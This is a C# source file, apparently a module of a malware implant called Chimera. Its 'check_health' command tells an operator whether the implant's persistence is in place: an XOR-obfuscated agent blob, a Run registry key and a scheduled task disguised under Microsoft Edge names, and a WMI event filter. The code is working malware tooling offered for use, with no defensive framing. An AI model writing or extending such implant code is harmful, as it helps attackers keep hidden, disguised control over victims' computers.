using System;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;

namespace Chimera.Commands
{
    // check_health — read-only audit of persistence state.
    // Does not fix anything — just reports what the operator should know.
    //
    // Checks:
    //   1. Staging directory exists
    //   2. agent.dat present and readable (reports size)
    //   3. HKCU Run key (persist) is present
    //   4. Scheduled task MicrosoftEdgeHelper (persist2) exists
    //   5. WMI EventFilter ChimeraStartupFilter exists
    //   6. Current XOR key (from registry state if mutated)
    public static class CheckHealth
    {
        private const string RunPath      = @"Software\Microsoft\Windows\CurrentVersion\Run";
        private const string RunValue     = "MicrosoftEdgeUpdate";
        private const string MutateRegPath = @"Software\Microsoft\EdgeSync";
        private const string MutateRegKey  = "Upd";
        private const string Persist2Task  = "MicrosoftEdgeHelper";
        private const string WmiFilterName = "ChimeraStartupFilter";
        private static readonly string BlobPath = Path.Combine(Staging.Dir, "agent.dat");

        public static string Execute()
        {
            var sb = new System.Text.StringBuilder();
            int pass = 0, fail = 0;

            sb.AppendLine("=== Chimera Health Check ===");
            sb.AppendLine();

            // ----------------------------------------------------------------
            // 1. Staging directory
            // ----------------------------------------------------------------
            if (Directory.Exists(Staging.Dir))
            {
                sb.AppendLine("[+] Staging dir   : " + Staging.Dir + " (exists)");
                pass++;
            }
            else
            {
                sb.AppendLine("[-] Staging dir   : " + Staging.Dir + " MISSING");
                fail++;
            }

            // ----------------------------------------------------------------
            // 2. agent.dat
            // ----------------------------------------------------------------
            if (File.Exists(BlobPath))
            {
                try
                {
                    long sz = new FileInfo(BlobPath).Length;
                    sb.AppendLine("[+] agent.dat     : present (" + sz + " bytes)");
                    pass++;
                }
                catch (Exception ex)
                {
                    sb.AppendLine("[-] agent.dat     : exists but unreadable — " + ex.Message);
                    fail++;
                }
            }
            else
            {
                sb.AppendLine("[-] agent.dat     : NOT FOUND  (run 'persist' to create)");
                fail++;
            }

            // ----------------------------------------------------------------
            // 3. XOR key state
            // ----------------------------------------------------------------
            try
            {
                byte key = 0x41;
                using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(MutateRegPath))
                {
                    if (rk != null)
                    {
                        object val = rk.GetValue(MutateRegKey);
                        if (val != null) key = (byte)(int)val;
                    }
                }
                sb.AppendLine("[*] XOR key       : 0x" + key.ToString("X2") +
                              (key == 0x41 ? " (original)" : " (mutated)"));
            }
            catch
            {
                sb.AppendLine("[*] XOR key       : 0x41 (assumed default)");
            }

            // ----------------------------------------------------------------
            // 4. HKCU Run key (persist)
            // ----------------------------------------------------------------
            try
            {
                using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(RunPath))
                {
                    if (rk != null && rk.GetValue(RunValue) != null)
                    {
                        sb.AppendLine("[+] HKCU Run      : " + RunValue + " present");
                        pass++;
                    }
                    else
                    {
                        sb.AppendLine("[-] HKCU Run      : " + RunValue + " NOT found" +
                                      "  (run 'persist' to install)");
                        fail++;
                    }
                }
            }
            catch (Exception ex)
            {
                sb.AppendLine("[-] HKCU Run      : error reading key — " + ex.Message);
                fail++;
            }

            // ----------------------------------------------------------------
            // 5. Scheduled task (persist2)
            // ----------------------------------------------------------------
            try
            {
                string taskOut = RunCmd(
                    "schtasks /query /tn \"" + Persist2Task + "\" /fo LIST 2>&1");
                bool found =
                    taskOut.IndexOf(Persist2Task, StringComparison.OrdinalIgnoreCase) >= 0 &&
                    taskOut.IndexOf("Could not be found",
                        StringComparison.OrdinalIgnoreCase) < 0 &&
                    taskOut.IndexOf("ERROR:", StringComparison.OrdinalIgnoreCase) < 0;

                if (found)
                {
                    sb.AppendLine("[+] Task (persist2): '" + Persist2Task + "' registered");
                    pass++;
                }
                else
                {
                    sb.AppendLine("[*] Task (persist2): '" + Persist2Task + "' not found" +
                                  "  (run 'persist2 install' to create)");
                    // not a hard failure — persist2 is optional
                }
            }
            catch (Exception ex)
            {
                sb.AppendLine("[-] Task check    : " + ex.Message);
            }

            // ----------------------------------------------------------------
            // 6. WMI EventFilter (persist2 installwmi)
            // ----------------------------------------------------------------
            try
            {
                string wmiOut = RunCmd(
                    "powershell -NoP -C \"Get-WMIObject -Namespace root\\subscription " +
                    "-Class __EventFilter | Select-Object Name | ft -HideTableHeaders\"");

                bool wmiFound =
                    wmiOut.IndexOf(WmiFilterName, StringComparison.OrdinalIgnoreCase) >= 0;

                if (wmiFound)
                {
                    sb.AppendLine("[+] WMI persist   : " + WmiFilterName + " registered");
                    pass++;
                }
                else
                {
                    sb.AppendLine("[*] WMI persist   : " + WmiFilterName + " not found" +
                                  "  (run 'persist2 installwmi' to create)");
                }
            }
            catch (Exception ex)
            {
                sb.AppendLine("[-] WMI check     : " + ex.Message);
            }

            // ----------------------------------------------------------------
            // Summary
            // ----------------------------------------------------------------
            sb.AppendLine();
            sb.AppendLine("--- Summary ---");
            sb.AppendLine("PASS: " + pass + "  FAIL: " + fail);
            if (fail > 0)
                sb.AppendLine("[!] Some checks failed. Re-run relevant persistence commands.");
            else
                sb.AppendLine("[+] Core persistence checks passed.");

            return sb.ToString();
        }

        private static string RunCmd(string cmd)
        {
            var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
            {
                UseShellExecute        = false,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                CreateNoWindow         = true
            };
            using (Process p = Process.Start(psi))
            {
                string o = p.StandardOutput.ReadToEnd();
                string e = p.StandardError.ReadToEnd();
                p.WaitForExit(15000);
                return o + e;
            }
        }
    }
}
